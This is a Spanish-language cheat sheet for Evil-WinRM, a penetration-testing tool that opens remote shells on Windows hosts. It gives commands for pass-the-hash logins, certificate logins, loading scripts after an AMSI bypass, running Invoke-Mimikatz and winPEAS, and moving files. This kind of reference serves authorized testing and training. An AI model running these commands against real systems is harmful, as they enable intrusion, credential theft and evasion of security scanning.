# Evil-WinRM Cheat Sheet

#### Conexión usando usuario y contraseña
```
evil-winrm -i <IP-TARGET> -u '<USER>' -p '<PASSWORD>'
```

#### Conexión usando usuario con contraseña y conexión por SSL
```
evil-winrm -i <IP-TARGET> -u '<USER>' -p '<PASSWORD>' -S
```

#### Conexión usando un NT Hash
```
evil-winrm -i <IP-TARGET> -u '<USER>' -H '<NT-HASH>'
```

#### Conexión por SSL y proporcionando llave publica y privada
```
evil-winrm -i <IP-TARGET> -c <CERTIFICATE.pem> -k <PRIVATE-KEY.pem> -S
evil-winrm -i <IP-TARGET> -c <CERTIFICATE.pem> -k <PRIVATE-KEY.pem> -S -u '<USER>' -p '<PASSWORD>'
```

#### Cargar scripts de Powershell
```
evil-winrm --i <IP-TARGET> -u '<USER>' -p '<PASSWORD>' -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz
```

#### Ejecutar archivos exe
```
evil-winrm --i <IP-TARGET> -u '<USER>' -p '<PASSWORD>' -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

#### Conexión y guardar los logs de toda la sesión
```
evil-winrm -i <IP-TARGET> -u '<USER>' -p '<PASSWORD>' -l
```

#### Descargar un archivo dentro de sesión evil-winrm
```
Evil-WinRM> download C:\PATH\<FILE>
```

#### Cargar un archivo dentro de sesión evil-winrm
```
Evil-WinRM> upload <FILE>
```

#### Enumerar servicios del equipo dentro de sesión evil-winrm
```
Evil-WinRM> menu

services
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)